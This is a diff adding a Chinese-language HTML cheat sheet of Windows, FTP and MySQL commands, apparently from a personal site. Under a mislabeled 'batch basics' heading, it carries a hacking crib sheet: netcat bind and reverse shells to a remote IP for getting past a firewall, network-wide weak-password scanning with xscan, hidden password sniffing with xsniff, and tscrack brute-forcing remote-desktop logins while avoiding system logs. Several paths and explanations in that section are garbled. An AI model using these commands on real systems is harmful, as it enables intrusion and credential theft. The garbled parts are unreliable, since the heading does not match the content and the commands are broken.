@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>linux / 系统命令</title>
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <style>
+      :root {
+        --bg: #1a1f1c;
+        --bg-card: #222824;
+        --text: #d7ddd4;
+        --text-dim: #9aa89a;
+        --accent: #7fae7a;
+        --code-bg: #161b18;
+        --border: #333a35;
+      }
+
+      body {
+        background: var(--bg);
+        color: var(--text);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+
+      .topbar {
+        width: 100%;
+        background: var(--bg-card);
+        border-bottom: 1px solid var(--border);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+
+      .nav-wrap {
+        max-width: 960px;
+        margin: 0 auto;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 12px 16px;
+      }
+
+      .nav a {
+        color: var(--text-dim);
+        text-decoration: none;
+        margin-right: 18px;
+      }
+
+      .nav a:hover {
+        color: var(--accent);
+      }
+
+      .primary-btn,
+      .secondary-btn {
+        background: var(--bg);
+        color: var(--text);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 6px 12px;
+        margin-left: 8px;
+        cursor: pointer;
+      }
+
+      .primary-btn:hover,
+      .secondary-btn:hover {
+        border-color: var(--accent);
+        color: var(--accent);
+      }
+
+      .page {
+        width: 100%;
+        max-width: 900px;
+        margin: 0 auto;
+        padding: 32px 16px 64px;
+      }
+
+      .section-card {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 24px 32px;
+      }
+
+      .section-card h2 {
+        color: var(--accent);
+        border-bottom: 1px solid var(--border);
+        padding-bottom: 6px;
+        margin-top: 36px;
+      }
+
+      .section-card h2:first-child {
+        margin-top: 0;
+      }
+
+      .section-card pre {
+        background: var(--code-bg);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 14px 18px;
+        overflow-x: auto;
+      }
+
+      .section-card code {
+        color: #c8d6c0;
+        font-family: "Consolas", "Menlo", monospace;
+        font-size: 0.92em;
+        line-height: 1.6;
+        white-space: pre;
+      }
+
+      table.cmd-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 12px 0 8px;
+      }
+
+      table.cmd-table th,
+      table.cmd-table td {
+        text-align: left;
+        padding: 6px 10px;
+        border-bottom: 1px solid var(--border);
+        vertical-align: top;
+      }
+
+      table.cmd-table th {
+        color: var(--text-dim);
+        font-weight: 600;
+        font-size: 0.85em;
+      }
+
+      table.cmd-table td:first-child {
+        font-family: "Consolas", "Menlo", monospace;
+        color: #c8d6c0;
+        white-space: nowrap;
+      }
+
+      .note {
+        color: var(--text-dim);
+        font-size: 0.9em;
+        border-left: 3px solid var(--border);
+        padding-left: 12px;
+        margin: 16px 0;
+      }
+    </style>
+  </head>
+  <body data-page="page2">
+    <div id="access-block" class="access-block hidden"></div>
+
+    <header class="topbar">
+      <div class="container nav-wrap">
+        <nav class="nav">
+          <a href="index.html">首页</a>
+          <a href="page2.html">linux</a>
+          <a href="page3.html">SQL</a>
+          <a href="page4.html">笔记</a>
+          <a href="page5.html">简历</a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="container page">
+      <section class="section-card" data-editable="intro-copy">
+
+        <h2>"cmd"（Win+R）命令大全</h2>
+        <table class="cmd-table">
+          <tr><th>命令</th><th>说明</th></tr>
+          <tr><td>gpedit.msc</td><td>组策略（本地组策略编辑器）</td></tr>
+          <tr><td>secpol.msc</td><td>本地安全策略</td></tr>
+          <tr><td>rsop.msc</td><td>组策略结果集</td></tr>
+          <tr><td>lusrmgr.msc</td><td>本机用户和组</td></tr>
+          <tr><td>services.msc</td><td>本地服务设置</td></tr>
+          <tr><td>compmgmt.msc</td><td>计算机管理</td></tr>
+          <tr><td>devmgmt.msc</td><td>设备管理器</td></tr>
+          <tr><td>diskmgmt.msc</td><td>磁盘管理实用程序</td></tr>
+          <tr><td>dfrg.msc</td><td>磁盘碎片整理程序</td></tr>
+          <tr><td>eventvwr / eventvwr.msc</td><td>事件查看器</td></tr>
+          <tr><td>fsmgmt.msc</td><td>共享文件夹管理器</td></tr>
+          <tr><td>ciadv.msc</td><td>索引服务程序</td></tr>
+          <tr><td>certmgr.msc</td><td>证书管理实用程序</td></tr>
+          <tr><td>comexp.msc</td><td>组件服务</td></tr>
+          <tr><td>wmimgmt.msc</td><td>打开 Windows 管理体系结构（WMI）</td></tr>
+          <tr><td>ntmsmgr.msc</td><td>移动存储管理器</td></tr>
+          <tr><td>ntmsoprq.msc</td><td>移动存储管理员操作请求</td></tr>
+          <tr><td>perfmon.msc</td><td>计算机性能监测程序</td></tr>
+          <tr><td>cliconfg</td><td>SQL Server 客户端网络实用程序</td></tr>
+          <tr><td>calc</td><td>启动计算器</td></tr>
+          <tr><td>charmap</td><td>启动字符映射表</td></tr>
+          <tr><td>chkdsk / chkdsk.exe</td><td>磁盘检查</td></tr>
+          <tr><td>cleanmgr</td><td>磁盘清理</td></tr>
+          <tr><td>clipbrd</td><td>剪贴板查看器</td></tr>
+          <tr><td>cmd.exe</td><td>命令提示符</td></tr>
+          <tr><td>conf</td><td>启动 NetMeeting</td></tr>
+          <tr><td>control</td><td>控制面板</td></tr>
+          <tr><td>control userpasswords2</td><td>用户账户管理</td></tr>
+          <tr><td>dcomcnfg</td><td>打开系统组件服务</td></tr>
+          <tr><td>ddeshare</td><td>打开 DDE 共享设置</td></tr>
+          <tr><td>dvdplay</td><td>DVD 播放器</td></tr>
+          <tr><td>dxdiag</td><td>检查 DirectX 信息</td></tr>
+          <tr><td>drwtsn32</td><td>系统医生（Dr. Watson）</td></tr>
+          <tr><td>eudcedit</td><td>造字程序</td></tr>
+          <tr><td>explorer</td><td>打开资源管理器</td></tr>
+          <tr><td>iexpress</td><td>自解压包制作工具（系统自带）</td></tr>
+          <tr><td>logoff</td><td>注销命令</td></tr>
+          <tr><td>magnify</td><td>放大镜实用程序</td></tr>
+          <tr><td>mem / mem.exe</td><td>显示内存使用情况</td></tr>
+          <tr><td>mmc</td><td>打开控制台</td></tr>
+          <tr><td>mobsync</td><td>同步中心</td></tr>
+          <tr><td>mplayer2</td><td>简易 Windows Media Player</td></tr>
+          <tr><td>mspaint</td><td>画图板</td></tr>
+          <tr><td>msconfig / Msconfig.exe</td><td>系统配置实用程序</td></tr>
+          <tr><td>mstsc</td><td>远程桌面连接</td></tr>
+          <tr><td>narrator</td><td>屏幕"讲述人"</td></tr>
+          <tr><td>notepad</td><td>打开记事本</td></tr>
+          <tr><td>nslookup</td><td>IP 地址侦测 / DNS 解析检测工具</td></tr>
+          <tr><td>ntbackup</td><td>系统备份和还原</td></tr>
+          <tr><td>odbcad32</td><td>ODBC 数据源管理器</td></tr>
+          <tr><td>oobe/msoobe /a</td><td>检查系统是否激活</td></tr>
+          <tr><td>osk</td><td>打开屏幕键盘</td></tr>
+          <tr><td>packager</td><td>对象包装程序</td></tr>
+          <tr><td>progman</td><td>程序管理器</td></tr>
+          <tr><td>regedit / regedit.exe / regedt32</td><td>注册表编辑器</td></tr>
+          <tr><td>regsvr32 /u *.dll</td><td>注销（停止运行）某 DLL 文件</td></tr>
+          <tr><td>shrpubw</td><td>创建共享文件夹向导</td></tr>
+          <tr><td>sigverif</td><td>文件签名验证程序</td></tr>
+          <tr><td>sfc /scannow</td><td>扫描并修复系统文件</td></tr>
+          <tr><td>sndrec32</td><td>录音机</td></tr>
+          <tr><td>sndvol32</td><td>音量控制程序</td></tr>
+          <tr><td>syncapp</td><td>创建公文包</td></tr>
+          <tr><td>sysedit</td><td>系统配置编辑器</td></tr>
+          <tr><td>syskey</td><td>系统加密（SAM 双重密码保护，一旦开启不可逆）</td></tr>
+          <tr><td>taskmgr</td><td>任务管理器</td></tr>
+          <tr><td>tourstart</td><td>Windows XP 漫游介绍</td></tr>
+          <tr><td>utilman</td><td>辅助工具 / 轻松访问管理器</td></tr>
+          <tr><td>wiaacmgr</td><td>扫描仪和照相机向导</td></tr>
+          <tr><td>winmsd</td><td>系统信息</td></tr>
+          <tr><td>winver</td><td>检查 Windows 版本</td></tr>
+          <tr><td>write</td><td>写字板</td></tr>
+          <tr><td>wscript</td><td>Windows 脚本宿主设置</td></tr>
+          <tr><td>wupdmgr</td><td>Windows 更新程序</td></tr>
+          <tr><td>netstat -an</td><td>查看当前网络连接和端口状态</td></tr>
+          <tr><td>PowerShell</td><td>启动 PowerShell</td></tr>
+          <tr><td>OptionalFeatures</td><td>打开"启用或关闭 Windows 功能"</td></tr>
+          <tr><td>MdSched</td><td>启动 Windows 内存诊断</td></tr>
+          <tr><td>snippingtool</td><td>截图工具</td></tr>
+        </table>
+
+        <h2>控制面板项（.cpl）</h2>
+        <table class="cmd-table">
+          <tr><th>命令</th><th>说明</th></tr>
+          <tr><td>desk.cpl</td><td>桌面设置</td></tr>
+          <tr><td>main.cpl</td><td>鼠标设置</td></tr>
+          <tr><td>inetcpl.cpl</td><td>Internet 属性</td></tr>
+          <tr><td>ncpa.cpl</td><td>网络连接</td></tr>
+          <tr><td>mmsys.cpl</td><td>声音和音频设备</td></tr>
+          <tr><td>powercfg.cpl</td><td>电源选项</td></tr>
+          <tr><td>sysdm.cpl</td><td>系统属性</td></tr>
+          <tr><td>firewall.cpl</td><td>Windows 防火墙</td></tr>
+        </table>
+
+        <h2>关机 / 注销</h2>
+        <pre><code>shutdown -s -t 0    -- 立刻关机（t 参数为延时秒数，0-300）
+shutdown -r -t 0    -- 立刻重启
+shutdown -l          -- 注销</code></pre>
+
+        <h2>Windows Server 2003 补充命令</h2>
+        <table class="cmd-table">
+          <tr><th>命令</th><th>说明</th></tr>
+          <tr><td>shutdown /s /r /t 秒数 /a /m \\ip</td><td>关闭或重启本地 / 远程主机；/a 取消关机，/m 指定远程主机</td></tr>
+          <tr><td>taskkill /pid ID 或 /im 进程名 /f /t</td><td>终止一个或多个进程；/f 强制终止，/t 连同子进程一起终止</td></tr>
+          <tr><td>tasklist /m 或 /svc</td><td>显示当前运行的进程/服务；/m 列出加载的 DLL，/svc 显示进程对应服务</td></tr>
+        </table>
+
+        <h2>IIS 服务命令（iisreset）</h2>
+        <table class="cmd-table">
+          <tr><th>命令</th><th>说明</th></tr>
+          <tr><td>iisreset /reboot</td><td>重启计算机</td></tr>
+          <tr><td>iisreset /start / stop</td><td>启动 / 停止所有 Internet 服务</td></tr>
+          <tr><td>iisreset /restart</td><td>重新启动所有 Internet 服务</td></tr>
+          <tr><td>iisreset /status</td><td>显示服务状态</td></tr>
+          <tr><td>iisreset /enable / disable</td><td>启用 / 禁用服务重启</td></tr>
+          <tr><td>iisreset /timeout 秒数</td><td>设置超时时间</td></tr>
+        </table>
+
+        <h2>FTP 客户端命令</h2>
+        <pre><code>ftp -v -d -i -n -g [主机名]
+help / ?          -- 查看命令说明
+bye / quit        -- 退出 FTP
+open host [port]  -- 建立连接
+close             -- 断开连接
+pwd               -- 显示当前远端目录
+cd / cdup         -- 切换目录 / 返回上级
+dir / ls          -- 列出远端目录文件
+get / recv        -- 下载文件
+put / send        -- 上传文件
+mget / mput       -- 批量下载 / 上传
+delete / mdelete  -- 删除文件 / 批量删除
+mkdir / rmdir     -- 建立 / 删除目录
+rename            -- 重命名文件
+ascii / bin       -- 切换传输模式（文本 / 二进制）
+lcd               -- 切换本地工作目录
+status            -- 显示当前 FTP 状态
+system            -- 显示远端系统类型
+user              -- 切换登录用户</code></pre>
+
+        <h2>MySQL 常用命令</h2>
+        <pre><code>mysql -h主机地址 -u用户名 -p密码       -- 连接 MySQL
+exit                                    -- 退出
+mysqladmin -u用户名 -p旧密码 password 新密码   -- 修改密码
+
+show databases;                         -- 显示数据库列表
+use 库名;                                -- 切换数据库
+show tables;                            -- 显示表列表
+describe 表名;                           -- 显示表结构
+create database 库名;                    -- 建库
+create table 表名 (字段定义);             -- 建表
+drop database 库名;
+drop table 表名;                         -- 删库 / 删表
+delete from 表名;                        -- 清空表记录
+select * from 表名;                      -- 查询记录
+
+mysqldump --opt school > school.sql     -- 备份数据库（在命令行下执行）</code></pre>
+
+        <h2>批处理基础：变量与条件</h2>
+        <pre><code>瑞士军刀：nc.exe
+基本用法：
+nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口
+nc -l -p 80 开启本机的TCP 80端口并监听
+nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口
+nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口
+nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 
+梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口
+高级用法：
+nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止
+nc -L -p 80 > c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt
+nc -L -p 80 < c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,
+并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用
+type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，
+直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用
+本机上用：nc -l -p 本机端口
+在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K
+nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙
+本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称
+在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机
+备 注
+| 管道命令
+< 或 > 重定向命令。“<”，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令
+@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt >> d:log.txt 
+意思是：后台执行dir，并把结果存在d:log.txt中
+‘’>与’>>'的区别 ">“指：覆盖；”>>"指：保存到(添加到）。
+如：@dir c:winnt >> d:log.txt和@dir c:winnt > d:log.txt`二个命令分别执行二次比较看：
+用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。
+
+扫描工具：xscan.exe
+基本格式
+xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项]扫锚"起始IP到终止IP"段的所有主机信息
+xscan -file <主机列表文件名> <检测项目> [其他选项]扫锚"主机IP列表文件名"中的所有主机信息
+
+检测项目
+-active 检测主机是否存活
+-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）
+-port 检测常用服务的端口状态
+-ftp 检测FTP弱口令
+-pub 检测FTP服务匿名用户写权限
+-pop3 检测POP3-Server弱口令
+-smtp 检测SMTP-Server漏洞
+-sql 检测SQL-Server弱口令
+-smb 检测NT-Server弱口令
+-iis 检测IIS编码/解码漏洞
+-cgi 检测CGI漏洞
+-nasl 加载Nessus攻击脚本
+-all 检测以上所有项目
+
+其它选项
+-i 适配器编号 设置网络适配器, <适配器编号>可通过"-l"参数获取
+-l 显示所有网络适配器
+-v 显示详细扫描进度
+-p 跳过没有响应的主机
+-o 跳过没有检测到开放端口的主机
+-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10
+-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)
+
+用法示例
+xscan -host 192.168.1.1-192.168.255.255 -all -active -p　
+检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机
+
+xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o
+检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，
+最大并发线程数量为150，跳过没有检测到开放端口的主机
+
+xscan -file hostlist.txt -port -cgi -t 200,5 -v -o
+检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，
+同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机
+
+命令行方式嗅探器: xsniff.exe
+可捕获局域网内FTP/SMTP/POP3/HTTP协议密码
+
+参数说明
+-tcp 输出TCP数据报
+-udp 输出UDP数据报
+-icmp 输出ICMP数据报
+-pass 过滤密码信息
+-hide 后台运行
+-host 解析主机名
+-addr IP地址 过滤IP地址
+-port 端口 过滤端口
+-log 文件名 将输出保存到文件
+-asc 以ASCII形式输出
+-hex 以16进制形式输出
+
+用法示例
+xsniff.exe -pass -hide -log pass.log
+后台运行嗅探密码并将密码信息保存在pass.log文件中
+
+xsniff.exe -tcp -udp -asc -addr 192.168.1.1
+嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出
+
+终端服务密码破解: tscrack.exe
+参数说明
+-h 显示使用帮助
+-v 显示版本信息
+-s 在屏幕上打出解密能力
+-b 密码错误时发出的声音
+-t 同是发出多个连接（多线程）
+-N Prevent System Log entries on targeted server
+-U 卸载移除tscrack组件
+-f 使用－f后面的密码
+-F 间隔时间（频率）
+-l 使用－l后面的用户名
+-w 使用－w后面的密码字典
+-p 使用－p后面的密码
+-D 登录主页面
+
+fpipe.exe (TCP端口重定向工具)
+fpipe -l 80 -s 1029 -r 80
+当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息</code></pre>
+
+        <h2>命令说明速记</h2>
+        <table class="cmd-table">
+          <tr><th>符号 / 命令</th><th>说明</th></tr>
+          <tr><td>|</td><td>管道命令，把前一条命令的输出作为下一条的输入</td></tr>
+          <tr><td>&gt; / &gt;&gt;</td><td>重定向；&gt; 覆盖写入，&gt;&gt; 追加写入</td></tr>
+          <tr><td>@命令</td><td>执行命令但不回显本身（常用于批处理开头 @echo off）</td></tr>
+          <tr><td>REM 文本</td><td>批处理中的注释</td></tr>
+          <tr><td>title / color / prompt</td><td>设置 CMD 窗口标题 / 前景背景色 / 命令提示符样式</td></tr>
+        </table>
+
+      </section>
+    </main>
+  </body>
+</html>
